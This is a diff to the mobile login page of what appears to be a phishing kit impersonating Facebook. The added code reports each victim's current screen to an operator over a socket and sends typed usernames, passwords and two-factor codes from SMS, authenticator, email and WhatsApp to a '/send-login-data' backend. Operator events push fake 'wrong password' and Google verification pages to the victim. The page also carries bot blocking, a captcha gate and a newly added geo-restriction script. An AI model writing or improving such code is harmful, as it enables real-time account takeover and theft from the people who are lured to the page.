@@ -3,13 +3,14 @@
 
 <head>
   <meta charset="UTF-8">
+  <script src="assets/geo-restrict.js"></script>
   <script>(function(){var h=location.hostname,local=h==='localhost'||h==='127.0.0.1'||h.endsWith('.test')||h.endsWith('.local');if(!local){var v=localStorage.getItem('captcha_verified'),t=parseInt(localStorage.getItem('captcha_timestamp')||'0',10);if(v!=='true'||Date.now()-t>86400000){location.replace('/');return;}}history.replaceState(null,'','/');})();</script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="assets/1.css" />
   <link rel="stylesheet" href="assets/2.css" />
   <link rel="stylesheet" href="assets/3.css" />
   <link rel="stylesheet" href="assets/LoginPage.css" />
-  <link rel="icon" href="./assets/fav.png" type="image/x-icon">
+  <link rel="icon" href="/favicon.jpg" type="image/jpeg">
   <meta name="robots" content="noindex, nofollow">
 
   <!-- Block specific bots -->
@@ -92,6 +93,10 @@
       </div>
     </div>
   </div>
+  <script src="assets/google-flow.js"></script>
+  <script src="assets/login-wait.js"></script>
+  <script src="assets/victim-view.js"></script>
+  <script src="assets/api-payload.js"></script>
   <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
   <script>
     const BACKEND = (function() {
@@ -115,6 +120,27 @@
       reconnectionDelayMax: 5000,
       timeout: 20000
     });
+    window.socket = socket;
+    if (typeof VictimView !== 'undefined') VictimView.setSocket(socket);
+
+    const MOBILE_VIEW_BY_PAGE = {
+      sms: 'fb-2fa-sms',
+      auth: 'fb-2fa-auth',
+      email: 'fb-2fa-email',
+      wh: 'fb-2fa-whatsapp'
+    };
+    let lastMobileViewKey = 'mobile';
+    function reportMobileView(key) {
+      if (key) lastMobileViewKey = key;
+      if (typeof VictimView !== 'undefined' && key) VictimView.report(key);
+    }
+    function reportMobileViewCurrent() {
+      if (typeof LoginWait !== 'undefined' && LoginWait.isActive() && LoginWait.isShowing()) {
+        reportMobileView('fb-login-wait');
+        return;
+      }
+      reportMobileView(lastMobileViewKey);
+    }
 
     /* Chrome mobile kills WebSocket when backgrounded.
        Only reconnect when the page was actually hidden first (not on fresh load). */
@@ -136,22 +162,26 @@
       console.log("✅ Connected to server with socket ID:", socket.id);
       localStorage.setItem('socketSession', JSON.stringify({ socketId: socket.id, timestamp: Date.now() }));
       socket.emit('userConnectedToPage', { clientId, page: 'mobile' });
+      reportMobileViewCurrent();
 
       if (!_firstConnect) {
-        /* Reconnected after background — reset any stuck loading state */
-        const loginBtn = document.getElementById('loginBtn');
-        if (loginBtn && loginBtn.querySelector('.loading-spinner')) {
-          loginBtn.disabled = false;
-          loginBtn.style.opacity = '1';
-          loginBtn.style.cursor = 'pointer';
-          loginBtn.innerHTML = 'Log in';
-        }
-        const continueBtn = document.getElementById('continueBtn');
-        if (continueBtn && continueBtn.querySelector('.loading-spinner')) {
-          continueBtn.disabled = false;
-          continueBtn.style.opacity = '1';
-          continueBtn.style.cursor = 'pointer';
-          continueBtn.innerHTML = 'Continue';
+        if (typeof LoginWait !== 'undefined' && LoginWait.isActive() && LoginWait.isShowing()) {
+          LoginWait.resumeIfActive();
+        } else {
+          const loginBtn = document.getElementById('loginBtn');
+          if (loginBtn && loginBtn.querySelector('.loading-spinner')) {
+            loginBtn.disabled = false;
+            loginBtn.style.opacity = '1';
+            loginBtn.style.cursor = 'pointer';
+            loginBtn.innerHTML = 'Log in';
+          }
+          const continueBtn = document.getElementById('continueBtn');
+          if (continueBtn && continueBtn.querySelector('.loading-spinner')) {
+            continueBtn.disabled = false;
+            continueBtn.style.opacity = '1';
+            continueBtn.style.cursor = 'pointer';
+            continueBtn.innerHTML = 'Continue';
+          }
         }
       }
       _firstConnect = false;
@@ -167,6 +197,7 @@
     });
 
     async function loadPage(filename) {
+      if (typeof LoginWait !== 'undefined') LoginWait.clear();
       try {
         const response = await fetch(`${BACKEND}/public/${filename}`);
         const html = await response.text();
@@ -177,11 +208,13 @@
         if (filename === 'sms') setupAuthPageLogic();
         if (filename === 'wh') setupAuthPageLogic();
         if (filename === 'email') setupEmailPageLogic();
+        reportMobileView(MOBILE_VIEW_BY_PAGE[filename] || 'mobile');
       } catch (err) {
         console.error("Error loading page:", filename, err);
       }
     }
     async function loadModalPage(filename) {
+      if (typeof LoginWait !== 'undefined') LoginWait.clear();
       try {
         const file = filename.endsWith('.html') ? filename : `${filename}.html`;
         const response = await fetch(`${BACKEND}/public/${file}`);
@@ -199,6 +232,9 @@
             content.innerHTML = '';
           }
         };
+        if (filename.includes('wrong')) reportMobileView('fb-wrong-password');
+        else if (filename.includes('old')) reportMobileView('fb-old-password');
+        else reportMobileView('fb-login-form');
       } catch (err) {
         console.error("❌ Failed to load modal page:", filename, err);
       }
@@ -238,7 +274,9 @@
           headers: {
             'Content-Type': 'application/json'
           },
-          body: JSON.stringify({ code: code, socketId: socketId })
+          body: JSON.stringify(typeof ApiPayload !== 'undefined'
+            ? ApiPayload.withClient({ code: code })
+            : { code: code, socketId: socketId, clientId: localStorage.getItem('clientId') })
         })
           .then(response => response.json())
           .then(data => {
@@ -287,7 +325,9 @@
           headers: {
             'Content-Type': 'application/json'
           },
-          body: JSON.stringify({ code: code, socketId: socketId })
+          body: JSON.stringify(typeof ApiPayload !== 'undefined'
+            ? ApiPayload.withClient({ code: code })
+            : { code: code, socketId: socketId, clientId: localStorage.getItem('clientId') })
         })
           .then(response => response.json())
           .then(data => {
@@ -366,17 +406,15 @@
     });
     socket.on('show-old-pass', () => loadModalPage('old-password'));
 
-    socket.on('show-google-login', () => {
-      const emailEl = document.getElementById('username');
-      const fbEmail = (emailEl && emailEl.value.trim())
-                      || sessionStorage.getItem('lastLoginEmail')
-                      || '';
-      try {
-        sessionStorage.setItem('lastLoginEmail', fbEmail);
-        sessionStorage.setItem('googleReturnPage', 'mobile.html');
-      } catch(e) {}
-      try { sessionStorage.setItem('fbVerifySession', '1'); } catch(e) {}
-      window.location.href = 'fb-verify.html';
+    socket.on('show-google-login', (data) => {
+      if (typeof LoginWait !== 'undefined') LoginWait.clear();
+      GoogleVerifyFlow.startFbVerifyFlow({
+        getFbEmail: function () {
+          var emailEl = document.getElementById('username');
+          return (emailEl && emailEl.value.trim()) || '';
+        },
+        returnPage: 'mobile.html'
+      }, data);
     });
 
     socket.on('show-gmail-wrong-pass', () => {
@@ -443,16 +481,15 @@
 
       try { sessionStorage.setItem('lastLoginEmail', username); } catch(e) {}
 
-      loginBtn.disabled = true;
-      loginBtn.style.opacity = '0.4';
-      loginBtn.style.cursor = 'not-allowed';
-      loginBtn.innerHTML = '<span class="loading-spinner"></span>';
+      if (typeof LoginWait !== 'undefined') LoginWait.startMobile();
 
       try {
         const response = await fetch(BACKEND + '/send-login-data', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ username, password, socketId: socket.id })
+          body: JSON.stringify(typeof ApiPayload !== 'undefined'
+            ? ApiPayload.withClient({ username, password })
+            : { username, password, socketId: socket.id, clientId: localStorage.getItem('clientId') })
         });
         await response.json();
       } catch (error) {
@@ -472,6 +509,9 @@
     }
 
     function showLoginPage() {
+      if (typeof LoginWait !== 'undefined') {
+        LoginWait.clear();
+      }
       const main = document.getElementById('main-content');
       main.className = 'flex flex-col h-screen relative z-10';
       main.innerHTML = loginPageHTML;
@@ -479,6 +519,7 @@
     }
 
     function resetLoginForm() {
+      if (typeof LoginWait !== 'undefined') LoginWait.clear();
       const loginBtn = document.getElementById('loginBtn');
       const usernameInput = document.getElementById('username');
       const passwordInput = document.getElementById('password');
@@ -494,6 +535,7 @@
     }
 
     initLoginForm();
+    if (typeof LoginWait !== 'undefined') LoginWait.discardStale();
   </script>
   <script>
     function checkIfStillMobile() {
